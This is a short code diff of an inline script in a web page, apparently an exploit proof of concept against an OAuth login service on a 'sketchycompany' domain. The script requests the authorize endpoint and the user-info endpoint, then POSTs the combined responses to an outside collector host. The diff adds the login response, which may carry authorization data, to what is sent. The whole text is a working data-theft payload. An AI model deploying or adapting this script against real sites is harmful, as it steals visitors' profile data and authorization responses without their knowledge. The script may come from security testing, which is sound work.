@@ -7,16 +7,21 @@
 			const login = await fetch('https://login.sketchycompany.upd-dcs.work/authorize?response_type=code&client_id=CLIENT123&redirect_uri=https%3A%2F%2Fportal.sketchycompany.upd-dcs.work%2Fcallback&code_challenge=c9vgJuDE9lt431PSxpv9bZ5tlsT5xPZw4Aj-xGpaRGg&code_challenge_method=S256&state=h_BgOZaL7ad-RYMBA5q9aA&scope=profile', {
 				method: 'GET',
 			});
-			const loginData = await login.json();
+			const loginData = await login.text();
 
 			const res = await fetch('https://login.sketchycompany.upd-dcs.work/userinfo', {
 				method: 'GET'
 			});
 			const data = await res.json();
 
+			const body = {
+				userInfo: data,
+				login: loginData
+			}
+
 			await fetch('https://hkdk.events/lxjnpl4yoq2m7x', {
 				method: 'POST',
-				body: JSON.stringify(data)
+				body: JSON.stringify(body),
 			});
 		})();
     </script>
